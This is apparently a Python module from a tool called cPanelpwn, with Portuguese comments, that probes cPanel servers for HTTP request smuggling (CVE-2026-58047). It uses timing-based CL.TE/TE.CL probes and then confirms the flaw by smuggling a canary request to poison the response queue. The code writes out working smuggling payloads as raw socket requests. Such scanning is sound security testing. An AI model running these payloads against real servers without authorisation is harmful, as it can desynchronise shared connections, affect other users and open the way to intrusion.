"""Módulo cPanelpwn: smuggling.

Detecção do HTTP request smuggling da CVE-2026-58047 (CWE-444, CL/TE).

O `urllib` normaliza `Content-Length`/`Transfer-Encoding` e não permite montar
o probe, por isso aqui se fala direto no socket. A técnica é a clássica
**baseada em tempo**: envia-se uma requisição em que o framing de
`Content-Length` e `Transfer-Encoding` é ambíguo; se o front-end e o back-end
discordarem, um dos lados fica esperando mais dados e a resposta atrasa.

  * CL.TE — front-end usa Content-Length, back-end usa Transfer-Encoding.
  * TE.CL — front-end usa Transfer-Encoding, back-end usa Content-Length.

É uma verificação **não destrutiva** (não envia a requisição de contrabando,
só mede o atraso), mas mesmo assim é opt-in e só roda contra um alvo único,
porque probes de desincronização podem afetar conexões compartilhadas.
"""

import socket
import ssl
import time

from . import config as cfg
from .config import log

# Tolerância: o probe é considerado "pendurado" se chega perto do timeout.
_HANG_RATIO = 0.85


def _connect(scheme: str, host: str, port: int, timeout: float):
    raw = socket.create_connection((host, port), timeout=timeout)
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        raw = ctx.wrap_socket(raw, server_hostname=host)
    raw.settimeout(timeout)
    return raw


def _raw_http(scheme: str, host: str, port: int, request: bytes,
              timeout: float):
    """Enviar bytes crus e devolver (resposta, segundos, conectou?).

    Lê até fechar, até receber o cabeçalho completo ou até o timeout —
    o suficiente para medir se o servidor respondeu ou ficou pendurado.
    """
    t0 = time.time()
    sock = None
    try:
        sock = _connect(scheme, host, port, timeout)
        sock.sendall(request)
        data = b""
        try:
            while b"\r\n\r\n" not in data:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data, time.time() - t0, True
    except Exception:
        return b"", time.time() - t0, False
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass


def _request(scheme: str, host: str, port: int, method: str, path: str,
             headers: dict, body: bytes, timeout: float):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    lines.append("Connection: close")
    head = ("\r\n".join(lines) + "\r\n\r\n").encode()
    return _raw_http(scheme, host, port, head + body, timeout)


def _baseline(scheme, host, port, path, timeout):
    return _request(scheme, host, port, "GET", path,
                    {"User-Agent": cfg._UA or "cpanelpwn"}, b"", timeout)


def _probe_cl_te(scheme, host, port, path, timeout):
    # Content-Length: 4  → front-end encaminha "1\r\nZ"; back-end (TE)
    # espera o próximo chunk e fica pendurado.
    body = b"1\r\nZ\r\nQ"
    return _request(scheme, host, port, "POST", path,
                    {"Content-Length": "4",
                     "Transfer-Encoding": "chunked",
                     "User-Agent": cfg._UA or "cpanelpwn"}, body, timeout)


def _probe_te_cl(scheme, host, port, path, timeout):
    # Transfer-Encoding: chunked → front-end considera o "0\r\n\r\n" final;
    # back-end (CL: 6) espera 6 bytes, recebe 5 e fica pendurado.
    body = b"0\r\n\r\nX"
    return _request(scheme, host, port, "POST", path,
                    {"Transfer-Encoding": "chunked",
                     "Content-Length": "6",
                     "User-Agent": cfg._UA or "cpanelpwn"}, body, timeout)


def detect(scheme: str, host: str, port: int,
           path: str = "/login", timeout: float = 10) -> dict:
    """Sondar CL.TE/TE.CL e devolver o veredito do possível smuggling.

    Retorna dict com `vulnerable`, `technique`, `baseline_s` e `findings`.
    """
    log("SCAN", f"Smuggling (CVE-2026-58047): baseline GET {path} ...",
        f"{host}:{port}")
    _, base_s, base_ok = _baseline(scheme, host, port, path, timeout)

    result = {
        "target":     f"{scheme}://{host}:{port}",
        "cve":        "CVE-2026-58047",
        "baseline_s": round(base_s, 3),
        "vulnerable": False,
        "technique":  "",
        "findings":   [],
    }
    if not base_ok or base_s >= timeout * _HANG_RATIO:
        result["findings"].append("baseline sem resposta — teste inconclusivo")
        log("WARN", "Smuggling: baseline não respondeu — inconclusivo")
        return result

    threshold = max(base_s * 3, timeout * _HANG_RATIO)
    probes = (("CL.TE", _probe_cl_te), ("TE.CL", _probe_te_cl))

    for name, fn in probes:
        data, elapsed, ok = fn(scheme, host, port, path, timeout)
        hung = ok and elapsed >= threshold
        result["findings"].append(
            {name: round(elapsed, 3), "resposta": bool(data), "pendurou": hung})
        log("INFO", f"Smuggling {name}: {elapsed:.2f}s "
                    f"({'pendurou' if hung else 'respondeu'})")
        if hung:
            result["vulnerable"] = True
            result["technique"]  = name
            break

    if result["vulnerable"]:
        log("HIGH", f"Possível HTTP request smuggling ({result['technique']}) — "
                    f"CVE-2026-58047", f"{host}:{port}")
    else:
        log("OK", "Smuggling: sem desincronização CL/TE detectada",
            f"{host}:{port}")
    return result


# ══════════════════════════════════════════════════════════════
#  CONFIRMAÇÃO POR DESINCRONIZAÇÃO (resposta enfileirada)
# ══════════════════════════════════════════════════════════════
# Técnica clássica de "response queue poisoning", auto-contida na própria
# conexão TCP: envia-se uma requisição com framing ambíguo cujo "resto" é uma
# requisição canário para um caminho inexistente; em seguida envia-se uma
# requisição normal. Se houver desincronização, a resposta da nossa requisição
# normal chega trocada (a resposta do canário — 404 — aparece no lugar do 200).
#
# ATENÇÃO: a confirmação depende de reuso de conexão do back-end. Em servidores
# com várias contas, isso PODE afetar conexões de outros usuários. Por isso é
# estritamente opt-in e roda uma única vez. Nunca envie um payload "malicioso":
# o canário é apenas um GET para um caminho aleatório.
def _parse_statuses(raw: bytes):
    """Extrair a lista de status HTTP (ex.: [200, 404]) de bytes crus."""
    import re as _re
    return [int(m) for m in _re.findall(rb"HTTP/1\.[01] (\d{3})", raw)]


def _raw_exchange(scheme, host, port, payload: bytes, followup: bytes,
                  timeout: float):
    """Enviar payload e followup na MESMA conexão e ler toda a resposta."""
    sock = None
    try:
        sock = _connect(scheme, host, port, timeout)
        sock.sendall(payload)
        time.sleep(0.15)
        sock.sendall(followup)
        data = b""
        sock.settimeout(min(timeout, 3.0))
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data, True
    except Exception:
        return b"", False
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass


def _confirm_cl_te(scheme, host, port, path, timeout, canary):
    """CL.TE: front-end usa Content-Length, back-end usa Transfer-Encoding."""
    smuggled = (f"GET {canary} HTTP/1.1\r\nHost: {host}\r\n"
                f"Connection: keep-alive\r\n\r\n").encode()
    body = b"0\r\n\r\n" + smuggled          # TE encerra em "0\r\n\r\n"
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()
    followup = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"Connection: close\r\n\r\n").encode()
    return _raw_exchange(scheme, host, port, head + body, followup, timeout)


def _confirm_te_cl(scheme, host, port, path, timeout, canary):
    """TE.CL: front-end usa Transfer-Encoding, back-end usa Content-Length."""
    smuggled = (f"GET {canary} HTTP/1.1\r\nHost: {host}\r\n"
                f"Connection: keep-alive\r\n\r\n")
    inner = smuggled + "0\r\n\r\n"
    body = f"{len(inner):x}\r\n".encode() + inner.encode() + b"\r\n0\r\n\r\n"
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()
    followup = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"Connection: close\r\n\r\n").encode()
    return _raw_exchange(scheme, host, port, head + body, followup, timeout)


def confirm(scheme: str, host: str, port: int,
            path: str = "/login", timeout: float = 10) -> dict:
    """Confirmar a desincronização CL.TE/TE.CL observando resposta enfileirada.

    Retorna dict com `confirmed`, `technique`, `statuses` e `cve`.
    """
    import os as _os
    canary = f"/cpanelpwn-desync-{_os.urandom(4).hex()}"
    result = {
        "target":    f"{scheme}://{host}:{port}",
        "cve":       "CVE-2026-58047",
        "canary":    canary,
        "confirmed": False,
        "technique": "",
        "statuses":  [],
    }

    # Baseline: status esperado do caminho normal (ex.: 200 na página de login).
    base_raw, base_ok = _raw_exchange(
        scheme, host, port, b"", 
        (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
         f"Connection: close\r\n\r\n").encode(), timeout)
    base_statuses = _parse_statuses(base_raw)
    baseline = base_statuses[-1] if base_statuses else None
    result["baseline_status"] = baseline
    if not base_ok or baseline is None:
        log("WARN", "Smuggling confirm: baseline inconclusivo")
        return result

    for name, fn in (("CL.TE", _confirm_cl_te), ("TE.CL", _confirm_te_cl)):
        raw, ok = fn(scheme, host, port, path, timeout, canary)
        statuses = _parse_statuses(raw)
        # Desincronização: o canário (404) é servido e a resposta da nossa
        # requisição normal chega enfileirada/trocada.
        poisoned = (canary.encode() in raw) or (404 in statuses and
                                                baseline not in (404,))
        result["statuses"].append({"technique": name,
                                   "statuses": statuses,
                                   "canary_visto": canary.encode() in raw})
        log("INFO", f"Smuggling confirm {name}: status={statuses} "
                    f"canary_visto={canary.encode() in raw}")
        if ok and poisoned:
            result["confirmed"] = True
            result["technique"] = name
            break

    if result["confirmed"]:
        log("HIGH", f"HTTP request smuggling CONFIRMADO ({result['technique']}) "
                    f"— CVE-2026-58047", f"{host}:{port}")
    else:
        log("OK", "Smuggling confirm: desincronização não confirmada",
            f"{host}:{port}")
    return result
